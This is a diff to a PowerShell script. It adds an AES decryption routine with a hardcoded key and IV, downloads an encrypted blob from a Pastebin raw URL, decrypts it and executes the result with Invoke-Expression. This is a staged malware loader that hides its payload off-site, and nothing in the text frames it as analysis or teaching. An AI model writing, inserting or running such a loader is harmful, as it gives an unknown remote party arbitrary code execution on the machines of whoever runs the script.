@@ -12,6 +12,34 @@ function D {
     $c.Close()
     [Text.Encoding]::UTF8.GetString($m.ToArray())
 }
+function D {
+    param($e, $k, $i)
+    $a = [System.Security.Cryptography.Aes]::Create()
+    $a.Key = $k
+    $a.IV = $i
+    $a.Padding = "PKCS7"
+    $d = $a.CreateDecryptor()
+    $b = [Convert]::FromBase64String($e)
+    $m = New-Object IO.MemoryStream
+    $c = New-Object Security.Cryptography.CryptoStream($m, $d, 'Write')
+    $c.Write($b, 0, $b.Length)
+    $c.Close()
+    [Text.Encoding]::UTF8.GetString($m.ToArray())
+}
+
+$k = [Convert]::FromBase64String("MWLR/AnZl1Hcjyfe5DgD43LdgkQtVISS28mCeNuRi9Q=")
+$i = [Convert]::FromBase64String("JIEvxYrJ4H/jObIrU3Ba9g==")
+
+try {
+    $raw = iwr "https://pastebin.com/raw/CHW3WPRA" -UseBasicParsing
+    $rawText = $raw.Content -replace '[^a-zA-Z0-9+/=]', ''  # Strips everything not Base64-valid
+    if ([string]::IsNullOrWhiteSpace($rawText)) {
+        throw "Empty or invalid base64 string pulled from Pastebin."
+    }
+    iex (D $rawText $k $i)
+} catch {
+    Write-Error "[-] Failed to fetch or execute encrypted payload: $_"
+}
 
 $k = [Convert]::FromBase64String("MWLR/AnZl1Hcjyfe5DgD43LdgkQtVISS28mCeNuRi9Q=")
 $i = [Convert]::FromBase64String("JIEvxYrJ4H/jObIrU3Ba9g==")
